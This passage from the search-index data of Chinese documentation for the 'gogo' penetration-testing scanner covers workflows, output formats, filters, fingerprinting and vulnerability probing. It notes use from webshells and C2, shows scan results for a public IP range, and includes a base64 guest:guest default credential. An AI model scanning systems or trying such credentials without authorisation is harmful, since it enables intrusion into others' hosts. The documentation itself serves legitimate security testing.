<p>\u8fd9\u6837\u539f\u6765\u540d\u5b57\u4e3a10\u7684workflow\u7684\u7aef\u53e3\u88ab\u4fee\u6539\u4e3a1-65535, \u5e76\u5f00\u542f\u4e86\u4e3b\u52a8\u6307\u7eb9\u8bc6\u522b\u4e0e\u4e3b\u52a8\u6f0f\u6d1e\u626b\u63cf.</p> <p>\u5982\u679c\u662f\u9700\u8981\u5bf9\u67d0\u4e2a\u7f51\u6bb5\u957f\u671f\u76d1\u63a7, \u8fd8\u53ef\u4ee5\u81ea\u5b9a\u4e49workflow.</p> <p>\u9884\u8bbe\u7684\u914d\u7f6e\u6587\u4ef6\u4f4d\u4e8e, v2/templates/workflows.yml, \u53ef\u4ee5\u4eff\u7167\u914d\u7f6e\u6587\u4ef6\u6dfb\u52a0\u65b0\u7684\u9884\u8bbe, \u5e76\u4f7f\u7528<code>--workflow filename</code> \u6307\u5b9a\u5bf9\u5e94\u7684\u9884\u8bbe.</p> <p>\u5982\u679c\u5728\u6e17\u900f\u7684\u8fdc\u7a0b\u73af\u5883\u4e0b, \u53ef\u4ee5\u4f7f\u7528yaml2json.py \u89c1\u81ea\u5b9a\u4e49\u9884\u8bbe\u8f6c\u4e3abase64\u7f16\u7801\u5b57\u7b26\u4e32, \u4f7f\u7528<code>--workflow 'b64de|[BASE64 string]'</code>\u6267\u884c.</p>"},{"location":"gogo/start/#output","title":"Output","text":"<p>\u547d\u4ee4\u884c\u9ed8\u8ba4\u8f93\u51fa\u7684\u8f93\u51fa\u683c\u5f0f\u4e3a\u4e00\u884c\u4e00\u4e2a\u7aef\u53e3, \u4ee5\u53ca\u83b7\u53d6\u5230\u7684\u76f8\u5173\u4fe1\u606f. </p> <p>\u9ed8\u8ba4\u662f\u4e0d\u5e26\u7740\u8272\u5668\u7684, \u5982\u679c\u9700\u8981\u7740\u8272\u4ee5\u83b7\u5f97\u66f4\u597d\u7684\u6548\u679c, \u8bf7\u6dfb\u52a0<code>-o color</code>, \u56e0\u4e3awebshell\u4e0ec2\u4e0d\u4e00\u5b9a\u652f\u6301\u7740\u8272\u5668, \u53ef\u80fd\u4f1a\u5bfc\u81f4\u4e71\u7801. </p> \u547d\u4ee4\u884c\u8f93\u51fa\u6837\u4f8b <pre><code>gogo -i 81.68.175.32/28 -p top2\n[*] Current goroutines: 1000, Version Level: 0,Exploit Target: none, PortSpray Scan: false ,2022-07-07 07:07.07\n[*] Starting task 81.68.175.32/28 ,total ports: 100 , mod: default ,2022-07-07 07:07.07\n[*] ports: 80,81,82,83,84,85,86,87,88,89,90,443,1080,2000,2001,3000,3001,4443,4430,5000,5001,5601,6000,6001,6002,6003,7000,7001,7002,7003,9000,9001,9002,9003,8080,8081,8082,8083,8084,8085,8086,8087,8088,8089,8090,8000,8001,8002,8003,8004,8005,8006,8007,8008,8009,8010,8011,8012,8013,8014,8015,8016,8017,8018,8019,8020,6443,8443,9443,8787,7080,8070,7070,7443,9080,9081,9082,9083,5555,6666,7777,9999,6868,8888,8889,9090,9091,8091,8099,8763,8848,8161,8060,8899,800,801,888,10000,10001,10080 ,2022-07-07 07:07.07\n[*] Scan task time is about 8 seconds ,2022-07-07 07:07.07\n[+] http://81.68.175.33:80      nginx/1.16.0            nginx                   bd37 [200] HTTP/1.1 200\n[+] http://81.68.175.32:80      nginx/1.18.0 (Ubuntu)           nginx                   8849 [200] Welcome to nginx!\n[+] http://81.68.175.34:80      nginx           \u5b9d\u5854||nginx                     f0fa [200] \u6ca1\u6709\u627e\u5230\u7ad9\u70b9\n[+] http://81.68.175.34:8888    nginx           nginx                   d41d [403] HTTP/1.1 403\n[+] http://81.68.175.34:3001    nginx           webpack||nginx                  4a9b [200] shop_mall\n[+] http://81.68.175.37:80      Microsoft-IIS/10.0              iis10                   c80f [200] HTTP/1.1 200             c0f6 [200] \u5b89\u5168\u5165\u53e3\u6821\u9a8c\u5931\u8d25\n[*] Alive sum: 5, Target sum : 1594 ,2022-07-07 07:07.07\n[*] Totally run: 4.0441884s ,2022-07-07 07:07.07\n</code></pre> <p>\u5728\u6ca1\u6709\u914d\u7f6e\u8f93\u51fa\u6587\u4ef6\u7684\u60c5\u51b5\u4e0b,\u6240\u6709\u5185\u5bb9\u4f1a\u8f93\u51fa\u5230\u6807\u51c6\u8f93\u51fa, \u5982\u679c\u6307\u5b9a\u4e86-f filename \u6216\u8005\u4f7f\u7528-af\u81ea\u52a8\u9009\u62e9\u6587\u4ef6\u540d(--af\u683c\u5f0f\u4e3a<code>ip_mask_port_mod_type.dat1</code>). \u5982\u679c\u6253\u5f00\u4e86\u6587\u4ef6\u8f93\u51fa\u4f1a\u81ea\u52a8\u5173\u95ed\u547d\u4ee4\u884c\u8f93\u51fa, \u9632\u6b62\u8fc7\u591a\u7684\u547d\u4ee4\u884c\u8f93\u51fa\u963b\u585ewebshell\u6216\u8005C2.</p> <p>\u5982\u679c\u60f3\u540c\u65f6\u4fdd\u7559\u4e24\u4e2a\u5730\u65b9\u7684\u8f93\u51fa, \u4e5f\u9884\u7559\u4e86\u53ef\u9009\u9879, \u4f7f\u7528<code>--tee</code> \u53c2\u6570\u80fd\u5728\u6307\u5b9a\u4e86-f\u7684\u65f6\u5019\u7ee7\u7eed\u4fdd\u7559\u547d\u4ee4\u884c\u8f93\u51fa. </p> <p>\u8f93\u51fa\u5230\u6587\u4ef6\u7684\u683c\u5f0f\u901a\u8fc7\u5927\u5199\u7684<code>-O</code>\u6307\u5b9a, \u5e38\u89c1\u7684\u8f93\u51fa\u683c\u5f0f\u6709:json(default), jsonlines, csv, \u53ef\u901a\u8fc7<code>-o</code> \u4e0e<code>-O</code> \u5206\u522b\u63a7\u5236\u4e24\u4e2a\u8f93\u51fa\u65b9\u5f0f\u7684\u683c\u5f0f. </p> <p>\u5982\u679c\u9700\u8981\u914d\u5408\u5176\u4ed6\u5de5\u5177, \u90a3\u5c31\u9700\u8981\u5c06\u65e5\u5fd7\u8f93\u51fa\u5173\u95ed, \u6216\u8005\u4e0d\u8f93\u5165\u5230\u6807\u51c6\u8f93\u5165, \u53ef\u4f7f\u7528<code>-q</code> \u5173\u95ed\u6240\u6709\u65e5\u5fd7\u8f93\u51fa.</p> <p>\u8f93\u51fa\u5230\u6587\u4ef6\u4f1a\u9ed8\u8ba4\u5f00\u542fdeflate\u538b\u7f29, \u5982\u679c\u60f3\u8981\u660e\u6587\u7684\u6587\u4ef6\u8f93\u51fa. \u53ef\u4ee5\u6307\u5b9a<code>-C</code>\u53c2\u6570\u5173\u95ed\u52a0\u5bc6.</p> <p>\u547d\u4ee4\u884c\u8f93\u51fa\u7684\u7f3a\u70b9</p> <p>\u547d\u4ee4\u884c\u8f93\u51fa\u6709\u4e0d\u5c11\u7f3a\u70b9, \u5f53\u4e00\u4e2aip\u5f00\u653e\u4e86\u591a\u4e2a\u7aef\u53e3, \u8bf7\u6c42\u54cd\u5e94\u7684\u987a\u5e8f\u65e0\u6cd5\u63a7\u5236, \u4f1a\u7ed3\u679c\u5bfc\u81f4\u4e1c\u4e00\u4e2a\u897f\u4e00\u4e2a, \u65e0\u6cd5\u5f88\u597d\u5730\u5173\u8054\u8d77\u6765; \u4e71\u5e8f\u7684\u8f93\u51fa\u662f\u5f88\u96be\u4eba\u5de5\u4ecb\u5165\u5224\u65ad\u626b\u63cf\u662f\u5426\u5b58\u5728\u6f0f\u62a5\u6216\u8005\u8bef\u62a5\u7684, \u56e0\u6b64\u66f4\u63a8\u8350\u4f7f\u7528\u8f93\u51fa\u5230\u6587\u4ef6, \u4f7f\u7528-F\u683c\u5f0f\u5316\u6392\u5e8f\u5e76\u6839\u636eIP\u805a\u7c7b\u6570\u636e.</p> <p>\u6ce8\u610f</p> <p>\u5982\u679c\u8f93\u51fa\u5230\u6587\u4ef6, \u9ed8\u8ba4\u4f1a\u8f93\u51fa\u5230\u4e0egogo\u4e8c\u8fdb\u5236\u6587\u4ef6\u540c\u76ee\u5f55. \u5982\u9700\u4fee\u6539\u6240\u6709\u6587\u4ef6\u7684\u8f93\u51fa\u76ee\u5f55, \u8bf7\u6307\u5b9a<code>--path [path]</code>. \u8fd9\u662f\u4e3a\u4e86webshell\u573a\u666f\u4e0b\u4e0d\u8f93\u51fa\u5230\u7f51\u7ad9\u6839\u76ee\u5f55.</p>"},{"location":"gogo/start/#\u8f93\u51fa\u5230\u6587\u4ef6","title":"\u8f93\u51fa\u5230\u6587\u4ef6","text":"<p>\u5728\u975e\u4ea4\u4e92\u573a\u666f\u4e0b, \u4f8b\u5982webshell\u4e2d, \u4e5f\u63d0\u4f9b\u4e86\u5206\u6790\u626b\u63cf\u8fdb\u5ea6\u7684\u529f\u80fd, \u626b\u63cf\u8fdb\u5ea6\u4f1a\u4ee5\u65e5\u5fd7\u7684\u5f62\u5f0f\u4fdd\u5b58\u5230<code>.sock.lock</code>\u6587\u4ef6\u4e2d. \u901a\u8fc7\u8bfb\u53d6\u6587\u4ef6\u5373\u53ef\u5224\u65ad\u5f53\u524d\u7684\u626b\u63cf\u8fdb\u5ea6.</p> <p>\u503c\u5f97\u4e00\u63d0\u7684\u662f, \u5c31\u7b97\u626b\u63cf\u4efb\u52a1\u6ca1\u6709\u7ed3\u675f, \u4e5f\u53ef\u4ee5\u4f7f\u7528-F\u683c\u5f0f\u5316\u5df2\u7ecf\u626b\u63cf\u5b8c\u6210\u7684\u90e8\u5206. gogo\u5e76\u975e\u5b9e\u65f6\u5199\u5165, \u6bcf\u4e2aC\u6bb5\u6216\u8005\u7f13\u51b2\u533a\u6bcf\u8d85\u8fc74k\u4fbf\u4f1a\u540c\u6b65\u5230\u6587\u4ef6\u4e00\u6b21.</p> <p>\u5982\u679c\u542f\u7528\u4e86\u542f\u53d1\u5f0f\u626b\u63cf, \u5219\u53ef\u80fd\u4f1a\u8f93\u51fa\u591a\u4e2a\u6587\u4ef6. \u5219\u5efa\u8bae\u4f7f\u7528<code>--af</code>(auto-filename), \u5206\u522b\u662f</p> <ul> <li>\u5e26default\u5173\u952e\u5b57\u7684\u626b\u63cf\u7ed3\u679c</li> <li>\u5e26ccidr\u5173\u952e\u5b57\u7684\u5b58\u6d3b\u7684c\u6bb5</li> <li>\u5e26bcidr\u5173\u952e\u5b57\u7684\u5b58\u6d3b\u7684b\u6bb5</li> <li>\u5e26alived\u5173\u952e\u5b57\u7684\u5b58\u6d3b\u7684ip</li> </ul> <p>\u6ce8\u610f.</p> <p>\u5982\u679c\u4f7f\u7528\u5728\u542f\u53d1\u5f0f\u626b\u63cf\u7684\u65f6\u5019 <code>-f filename</code>\u6307\u5b9a\u6587\u4ef6\u540d, \u5219\u53ea\u4f1a\u8f93\u51fa\u626b\u63cf\u7ed3\u679c, \u7f51\u6bb5\u4fe1\u606f\u548c\u5b58\u6d3b\u4fe1\u606f\u7684\u6587\u4ef6\u4e0d\u4f1a\u751f\u6210 </p>"},{"location":"gogo/start/#\u683c\u5f0f\u5316\u8f93\u51fa","title":"\u683c\u5f0f\u5316\u8f93\u51fa","text":"<p>\u8f93\u51fa\u6587\u4ef6\u9700\u8981 <code>-F</code>\u53c2\u6570\u8fdb\u884c\u683c\u5f0f\u5316, \u7528\u4ee5\u8fdb\u884c\u540e\u7eed\u7684\u5206\u6790\u4e0e\u5904\u7406. </p> <p>\u4e0d\u8bba\u662fbase64, deflate\u7b97\u6cd5\u538b\u7f29\u540e\u7684,\u8fd8\u662f\u660e\u6587\u7684json. gogo\u4f1a\u81ea\u52a8\u5224\u65ad\u683c\u5f0f\u5e76\u89e3\u6790.</p> <p>\u4f7f\u7528: <code>-F/--format file</code></p> <p>-F file \u4f1a\u81ea\u52a8\u89e3\u6790\u6587\u4ef6,\u5e76\u6392\u5e8f\u5f52\u7c7b\u7aef\u53e3\u4e0eip. \u8f93\u51fa\u6bd4\u9ed8\u8ba4\u7684\u547d\u4ee4\u884c\u8f93\u51fa\u53ef\u8bfb\u6027\u66f4\u597d\u7684\u7ed3\u679c. \u53ef\u4ee5\u5b9e\u9645\u4f53\u9a8c\u4e00\u4e0b, \u662f\u4e00\u4e2a\u6bd4\u9ed8\u8ba4\u547d\u4ee4\u884c\u8f93\u51fa\u66f4\u53cb\u597d\u7684\u683c\u5f0f. </p> \u683c\u5f0f\u5316\u8f93\u51fa\u6837\u4f8b <pre><code>gogo  -F .\\.81.68.175.32_28_all_default_json.dat1\nScan Target: 81.68.175.32/28, Ports: all, Mod: default\nExploit: none, Version level: 0\n\n[+] 81.68.175.32\n        http://81.68.175.32:80  nginx/1.18.0 (Ubuntu)           nginx                   8849 [200] Welcome to nginx!\n        tcp://81.68.175.32:22                   *ssh                     [tcp]\n        tcp://81.68.175.32:389                                           [tcp]\n[+] 81.68.175.33\n        tcp://81.68.175.33:3306                 *mysql                   [tcp]\n        tcp://81.68.175.33:22                   *ssh                     [tcp]\n        http://81.68.175.33:80  nginx/1.16.0            nginx                   bd37 [200] HTTP/1.1 200\n[+] 81.68.175.34\n        tcp://81.68.175.34:3306                 mysql 5.6.50-log                         [tcp]\n        tcp://81.68.175.34:21                   ftp                      [tcp]\n        tcp://81.68.175.34:22                   *ssh                     [tcp]\n        http://81.68.175.34:80  nginx           \u5b9d\u5854||nginx                     f0fa [200] \u6ca1\u6709\u627e\u5230\u7ad9\u70b9\n        http://81.68.175.34:8888        nginx           nginx                   d41d [403] HTTP/1.1 403\n        http://81.68.175.34:3001        nginx           webpack||nginx                  4a9b [200] shop_mall\n[+] 81.68.175.35\n        http://81.68.175.35:47001       Microsoft-HTTPAPI/2.0           microsoft-httpapi                       e702 [404] Not Found\n[+] 81.68.175.36\n        http://81.68.175.36:80  nginx   PHP     nginx                   babe [200] \u98ce\u95fb\u5ba2\u680824\u5c0f\u65f6\u53d1\u5361\u4e2d\u5fc3 - \u98ce\u95fb\u5ba2\u680824\u5c0f\u65f6\u53d1\u5361\u4e2d\u5fc3\n        tcp://81.68.175.36:22                   *ssh                     [tcp]\n...\n...\n</code></pre> <p>\u5982\u679c\u9700\u8981\u7740\u8272, \u540c\u6837\u9700\u8981\u6dfb\u52a0<code>-o color</code>. </p> \u5f85\u683c\u5f0f\u5316\u7684json\u6587\u4ef6\u6837\u4f8b <p><pre><code>{\n    \"config\": {\n        \"ip\": \"127.0.0.1/24\",\n        \"ips\": null,\n        \"ports\": \"top1\",\n        \"json_file\": \"\",\n        \"list_file\": \"\",\n        \"threads\": 4000,\n        \"mod\": \"default\",\n        \"alive_spray\": null,\n        \"port_spray\": false,\n        \"exploit\": \"auto\",\n        \"json_type\": \"scan\",\n        \"version_level\": 1\n    },\n    \"data\": [\n    ...\n    ]\n}\n</code></pre> \u8fd9\u4e2ajson\u6587\u4ef6\u4e2d\u662f\u4f1a\u5e26\u6709\u4efb\u52a1\u7684\u6458\u8981\u4fe1\u606f. \u6bcf\u4e2a\u7aef\u53e3\u7684\u8be6\u7ec6\u6570\u636e\u4f4d\u4e8edata\u5b57\u6bb5\u4e2d\u7684\u6570\u7ec4. </p> data\u4e2d\u7684result\u6837\u4f8b <p>\u8fd9\u662fdata\u4e2d\u6bcf\u4e2a\u5143\u7d20\u7684\u683c\u5f0f <pre><code>{\n    \"ip\": \"127.0.0.1\",\n    \"port\": \"80\",\n    \"frameworks\": {\n        \"nginx\": {\n            \"name\": \"nginx\",\n            \"froms\": {\n                \"0\": true,\n                \"3\": true\n            },\n            \"tags\": [\n                \"other\"\n            ]\n        },\n        \"rabbitmq-manager\": {\n            \"name\": \"rabbitmq-manager\",\n            \"froms\": {\n                \"0\": true,\n                \"2\": true\n            },\n            \"tags\": [\n                \"cloud\"\n            ]\n        }\n    },\n    \"vulns\": [\n        {\n            \"name\": \"rabbitmq-login\",\n            \"payload\": {\n                \"auth\": \"Z3Vlc3Q6Z3Vlc3Q=\"\n            },\n            \"severity\": 3\n        }\n    ],\n    \"protocol\": \"http\",\n    \"status\": \"200\",\n    \"language\": \"\",\n    \"title\": \"RabbitMQ Management\",\n    \"midware\": \"nginx/1.20.1\"\n}\n</code></pre></p> <p>\u6ce8\u610f.</p> <p>\u683c\u5f0f\u5316\u8f93\u51fa\u65f6\u4e5f\u652f\u6301<code>--af</code>, <code>-o</code>, <code>-f</code>\u7b49\u53c2\u6570, \u63a7\u5236\u8f93\u51fa\u7684\u683c\u5f0f\u4ee5\u53ca\u63a7\u5236\u8f93\u51fa\u7684\u6587\u4ef6, \u8fdb\u884c\u540e\u7eed\u7684\u5206\u6790.  </p>"},{"location":"gogo/start/#\u81ea\u5b9a\u4e49\u8f93\u51fa\u683c\u5f0f","title":"\u81ea\u5b9a\u4e49\u8f93\u51fa\u683c\u5f0f","text":"<p>\u5bf9\u4e8e\u8f93\u51fa\u7684\u683c\u5f0f, \u547d\u4ee4\u884c\u76ee\u524d\u9ed8\u8ba4\u662ffull, \u4f46\u662f\u4e3a\u4e86\u914d\u5408\u5176\u4ed6\u5de5\u5177, \u4e5f\u63d0\u4f9b\u4e86\u5404\u79cd\u683c\u5f0f\u7684\u8f93\u51fa, <code>-o ip</code>\u53c2\u6570\u6307\u5b9a\u9700\u8981\u7684\u5b57\u6bb5, \u4e5f\u652f\u6301\u9017\u53f7\u5206\u5272\u7684\u591a\u4e2a\u53c2\u6570, <code>-o ip,port,title</code>. \u4ee5\u53ca\u4e00\u4e9b\u7279\u6b8a\u503c, \u4f8b\u5982<code>-o url,target</code>\u7b49.</p> <p>\u5728\u626b\u63cf\u65f6\u53ef\u4ee5\u901a\u8fc7<code>-o</code> (\u8f93\u51fa\u5230\u547d\u4ee4\u884c\u7684\u683c\u5f0f, \u9ed8\u8ba4\u4e3afull)\u4e0e <code>-O</code> (\u8f93\u51fa\u7684\u6587\u4ef6\u7684\u683c\u5f0f, \u9ed8\u8ba4\u4e3ajson). \u5206\u522b\u63a7\u5236\u4e24\u4e2a\u8f93\u51fa\u7684\u683c\u5f0f.</p> <p>\u4f7f\u7528<code>-F</code>\u65f6, \u53ea\u9700\u8981\u4f7f\u7528<code>-o</code>.</p> <p>\u76ee\u524dgogo\u652f\u6301\u975e\u5e38\u591a\u7684\u8f93\u51fa\u683c\u5f0f. \u4f8b\u5982result\u7684\u5404\u79cd\u5b57\u6bb5:</p> <ul> <li>url , <code>protocol://ip:port</code> </li> <li>target , <code>ip:port</code></li> <li>ip,  IP</li> <li>port, \u7aef\u53e3</li> <li>protocol, \u534f\u8bae</li> <li>status, \u72b6\u6001\u7801, \u652f\u6301\u522b\u540dstat</li> <li>host, \u8bc1\u4e66/\u4e3b\u673a\u540d\u7b49\u5b57\u6bb5</li> <li>midware, http\u4e2d\u7684<code>Server</code> header</li> <li>language, \u8bed\u8a00</li> <li>os, \u64cd\u4f5c\u7cfb\u7edf</li> <li>title, \u6807\u9898</li> <li>frameworks, \u522b\u540dframe, \u6307\u7eb9</li> <li>vulns, \u522b\u540dvuln, \u6f0f\u6d1e</li> </ul> <p>\u53ef\u4ee5\u81ea\u7531\u7ec4\u5408, \u4f8b\u5982<code>-o ip,url,title</code>, \u9ed8\u8ba4\u4f1a\u4f7f\u7528<code>tab</code>\u5206\u5272.</p> <p>\u9664\u4e86\u8fd9\u4e9b\u5b57\u6bb5, \u8fd8\u5b58\u5728\u4e00\u4e9b\u7279\u6b8a\u7684\u8f93\u51fa\u683c\u5f0f. \u5982\u4e0b:</p> <ul> <li>json, \u8f93\u51fa\u4e3ajson, \u6587\u4ef6\u7684\u9ed8\u8ba4\u8f93\u51fa\u683c\u5f0f</li> <li>jsonlines,  \u522b\u540djl, \u4e00\u884c\u4e00\u4e2ajson\u7684\u7279\u6b8a\u683c\u5f0f.</li> <li>full, \u547d\u4ee4\u884c\u7684\u9ed8\u8ba4\u8f93\u51fa\u683c\u5f0f</li> <li>color, \u5e26\u989c\u8272\u7684full\u8f93\u51fa</li> <li>csv, \u8f93\u51fa\u4e3acsv</li> <li>zombie, \u5bfc\u51fa\u4e3azombie\u7684\u8f93\u5165\u683c\u5f0f</li> <li>cs, \u5bfc\u51fa\u4e3acobaltstrike\u4e2dtarget\u7684\u683c\u5f0f.</li> <li>extract, \u683c\u5f0f\u5316extract\u7ed3\u679c</li> </ul>"},{"location":"gogo/start/#\u8fc7\u6ee4\u5668","title":"\u8fc7\u6ee4\u5668","text":"<p>\u5728\u5f88\u591a\u573a\u666f\u4e0b, \u90fd\u9700\u8981\u4ece\u7ed3\u679c\u4e2d\u8fc7\u6ee4\u51fa\u7279\u5b9a\u7684\u76ee\u6807\u518d\u6b21\u626b\u63cf\u6216\u8005\u5bfc\u5230\u5176\u4ed6\u5de5\u5177\u4e2d, \u56e0\u6b64\u6dfb\u52a0\u4e86<code>--filter</code> \u53c2\u6570. </p> <p>filter\u53ef\u4ee5\u5728\u4e09\u79cd\u60c5\u51b5\u4e0b\u4f7f\u7528, \u5206\u522b\u4e3a.</p> <ol> <li>-F result.dat1 , \u5c06\u4eceresult\u4e2d\u8fc7\u6ee4\u7279\u5b9a\u7684\u7ed3\u679c\u5e76\u8f93\u51fa</li> <li>-j result.dat1 , \u4e0d\u5c11\u573a\u666f\u9700\u8981\u518d\u8fdb\u884c\u4e00\u6b21\u626b\u63cf,  \u53ef\u4ee5\u76f4\u63a5\u5728-j\u4e2d\u4f7f\u7528--filter, \u9009\u62e9\u5408\u9002\u7684\u7ed3\u679c\u8fdb\u884c\u518d\u6b21\u626b\u63cf</li> <li>\u626b\u63cf\u65f6, \u4f8b\u5982<code>gogo -i 1.1.1.1/24 --filter frame::nginx</code>, \u5728\u626b\u63cf\u65f6\u5c31\u8fdb\u884c\u8fc7\u6ee4,  \u88ab\u8fc7\u6ee4\u7684\u7ed3\u679c\u4e0d\u4f1a\u8f93\u51fa\u5230\u547d\u4ee4\u884c, \u4e5f\u4e0d\u4f1a\u8f93\u51fa\u5230\u6587\u4ef6\u4e2d.</li> </ol> <p>\u5f53\u524dfilter\u652f\u6301\u7684\u64cd\u4f5c, <code>==</code> \u5168\u7b49\u5339\u914d, <code>::</code> \u6a21\u7cca\u5339\u914d, <code>!=</code> \u4e0d\u7b49\u4e8e, <code>!:</code> \u4e0d\u5305\u542b</p> <p>filter\u7684key\u4e0e-o\u652f\u6301\u7684result\u5b57\u6bb5\u76f8\u540c, \u4f46\u4e0d\u652f\u6301-o\u4e2d\u7684\u7279\u6b8a\u5b57\u6bb5.</p> <p>example:</p> <p><code>gogo -F 1.dat --filter frame::weblogic</code> \u8fc7\u6ee4weblogic\u6846\u67b6</p> <p><code>gogo -F 1.dat --filter port==80</code> \u8fc7\u6ee4\u7aef\u53e3\u4e3a80\u7684\u7ed3\u679c</p> <p><code>gogo -F 1.dat --filter title!=</code> \u8fc7\u6ee4\u51fa\u6807\u9898\u4e0d\u4e3a\u7a7a\u7684\u7ed3\u679c</p> <p>filter\u7684\u7279\u6b8akey:</p> <ul> <li>tag, \u6307\u7eb9\u7684tag, \u6765\u81eagogo-templates\u4e2d\u7684\u6587\u4ef6\u540d, \u4ec5\u652f\u6301<code>==</code> \u4e0e<code>!=</code></li> <li>from, \u6307\u7eb9\u6765\u6e90, \u6765\u81eagogo\u4e2d\u7684\u4e0d\u540c\u63d2\u4ef6\u8bc6\u522b\u5230\u7684\u6307\u7eb9, ,\u4ec5\u652f\u6301<code>==</code> \u4e0e<code>!=</code></li> </ul> <p>example:</p> <p><code>gogo -F 1.dat --filter tag!=waf</code>  \u8fc7\u6ee4\u51fa\u4e0d\u5b58\u5728waf\u7684\u7ed3\u679c</p> <p><code>gogo -F 1.dat --filter tag==cloud</code>  \u8fc7\u6ee4\u51fa\u5b58\u5728\u4e91\u76f8\u5173\u7684\u7ed3\u679c</p> <p>filter\u8fd8\u652f\u6301\u4e00\u4e9b\u7279\u6b8a\u503c. </p> <ul> <li><code>gogo -F 1.dat --filter focus</code> \u5b58\u5728finger\u4e2d\u6807\u8bb0\u4e3afocus\u7684\u7ed3\u679c</li> <li><code>gogo -F 1.dat --filter vuln</code> \u5b58\u5728\u81f3\u5c11\u4e00\u4e2avuln\u7684\u7ed3\u679c</li> </ul> <p>\u6ce8\u610f.</p> <p>\u4f7f\u7528<code>-F 1.dat --filter</code>\u7684\u65f6\u5019\u4e5f\u53ef\u4ee5\u4f7f\u7528<code>-f</code>/<code>--af</code>\u5bf9filter\u7684\u7ed3\u679c\u518d\u6b21\u8f93\u51fa. </p>"},{"location":"gogo/start/#\u63d0\u53d6\u5668","title":"\u63d0\u53d6\u5668","text":"<p>gogo\u53ef\u4ee5\u4ece\u8fd4\u56de\u5185\u5bb9\u4e2d\u63d0\u53d6\u7684\u7279\u5b9a\u7684\u6570\u636e.</p> <p>\u53ef\u4ee5\u901a\u8fc7<code>--extract regexp</code>, \u81ea\u5b9a\u4e49\u6b63\u5219\u8868\u8fbe\u5f0f\u53bb\u63d0\u53d6\u6570\u636e. <code>--extract</code> \u53ef\u4ee5\u6dfb\u52a0\u591a\u4e2a.</p> <p>extract\u4e5f\u5b58\u5728\u4e00\u4e9b\u5e38\u7528\u7684\u9884\u8bbe, \u53ef\u4ee5\u901a\u8fc7<code>--extract url</code>\u8c03\u7528\u5185\u7f6e\u7684\u9884\u8bbe</p> <p>\u53ef\u901a\u8fc7<code>-P extract</code>\u67e5\u770b\u6240\u6709\u9884\u8bbe.</p> <p>\u6ce8\u610f.</p> <p>\u9ed8\u8ba4\u7684<code>gogo -F 1.dat</code>\u8f93\u51fa\u7684extract\u7ed3\u679c\u4ec5\u4e3a\u7f29\u7565\u62a5\u544a. \u5982\u9700\u67e5\u770b\u5b8c\u6574\u7684extract\u7ed3\u679c, \u9700\u8981<code>gogo -F 1.dat -o extract</code></p>"},{"location":"gogo/start/#advance-feature","title":"Advance Feature","text":""},{"location":"gogo/start/#\u7aef\u53e3spray\u6a21\u5f0f","title":"\u7aef\u53e3Spray\u6a21\u5f0f","text":"<p>\u4efb\u52a1\u751f\u6210\u5668\u4f1a\u4ee5\u7aef\u53e3\u4f18\u5148\u751f\u6210\u4efb\u52a1, \u800c\u975e\u9ed8\u8ba4\u7684ip\u4f18\u5148.</p> <p><code>gogo -i 172.16.1.1/24 -p top2 -s</code>l</p> <p>\u5728\u914d\u7f6e\u7684\u7aef\u53e3\u6570\u8d85\u8fc7500\u65f6, \u4f1a\u81ea\u52a8\u5f00\u542f. \u9632\u6b62\u8fc7\u9ad8\u7684\u5e76\u53d1\u5c06\u51e0\u5343\u4e2a\u8bf7\u6c42\u540c\u65f6\u6253\u5728\u540c\u4e00\u4e2a\u8bbe\u5907\u4e0a, \u9020\u6210dos.  \u53ef\u4ee5\u4f7f\u7528<code>--no-spray</code> \u5f3a\u5236\u5ffd\u7565\u6389\u8fd9\u4e2a\u4f18\u5316. </p>"},{"location":"gogo/start/#\u4e3b\u52a8\u6307\u7eb9\u8bc6\u522b","title":"\u4e3b\u52a8\u6307\u7eb9\u8bc6\u522b","text":"<p>gogo\u7684\u6307\u7eb9\u8bc6\u522b\u901a\u8fc7 fingers \u5b9e\u73b0</p> <p>\u5f53\u524d\u5305\u62ec\u6570\u5343\u6761web\u6307\u7eb9, \u6570\u767e\u6761favicon\u6307\u7eb9\u4ee5\u53ca\u6570\u5341\u6761tcp\u6307\u7eb9</p> <p>\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u53ea\u8fdb\u884c\u88ab\u52a8\u6307\u7eb9\u8bc6\u522b, \u5982\u9700\u8fdb\u884c\u4e3b\u52a8\u7684\u6307\u7eb9\u8bc6\u522b, \u9700\u8981\u624b\u52a8\u6dfb\u52a0<code>-v</code>\u53c2\u6570. http\u534f\u8bae\u7684\u4e3b\u52a8\u6307\u7eb9\u8bc6\u522b\u5df2\u81ea\u52a8\u9002\u914dkeep-alive.</p> <p><code>gogo -i 192.168.1.1/24 -p top2 -v</code></p> <p>\u6307\u7eb9\u8bc6\u522b\u5c06\u4f1a\u6807\u6ce8\u6307\u7eb9\u6765\u6e90, \u6709\u4ee5\u4e0b\u51e0\u79cd\u60c5\u51b5:</p> <ul> <li>active \u901a\u8fc7\u4e3b\u52a8\u53d1\u5305\u83b7\u53d6</li> <li>ico \u901a\u8fc7favicon\u83b7\u53d6</li> <li>404 \u901a\u8fc7\u968f\u673a\u76ee\u5f55\u83b7\u53d6</li> <li>guess \u53ea\u4f5c\u7528\u4e8etcp\u6307\u7eb9, \u6839\u636e\u670d\u52a1\u9ed8\u8ba4\u7aef\u53e3\u53f7\u731c\u6d4b</li> </ul> <p>\u8b66\u544a.</p> <p>tcp\u7684\u4e3b\u52a8\u6307\u7eb9\u8bc6\u522b\u5728\u6700\u574f\u60c5\u51b5\u4e0b, \u5fc5\u987b\u8981\u7b49\u5f85<code>\u8d85\u65f6\u65f6\u95f4\u4e0a\u9650*\u4e3b\u52a8\u6307\u7eb9\u6570\u91cf(\u76ee\u524d\u662f10\u6761)</code>. \u6240\u4ee5\u8bf7\u614e\u91cd\u5f00\u542f-v\u529f\u80fd, \u5185\u7f51\u7684\u67d0\u4e9b\u7f51\u7edc\u7b56\u7565\u4f1a\u5bfc\u81f4\u5f00\u542f\u4e86-v\u7684\u60c5\u51b5\u4e0b, \u8017\u65f6\u6025\u5267\u589e\u52a0.</p> <p>\u6ce8\u610f.</p> <p>\u5728\u5f00\u542f\u4e86<code>--debug</code>\u7684\u60c5\u51b5\u4e0b, \u5c06\u4f1a\u8f93\u51fa\u8be5\u6761\u6307\u7eb9\u662f\u547d\u4e2d\u4e86\u54ea\u6761\u914d\u7f6e. </p>"},{"location":"gogo/start/#\u4e3b\u52a8\u6f0f\u6d1e\u63a2\u6d4b","title":"\u4e3b\u52a8\u6f0f\u6d1e\u63a2\u6d4b","text":"<p>gogo\u7684\u6f0f\u6d1e\u63a2\u6d4b\u529f\u80fd\u901a\u8fc7neutron\u5b9e\u73b0.</p> 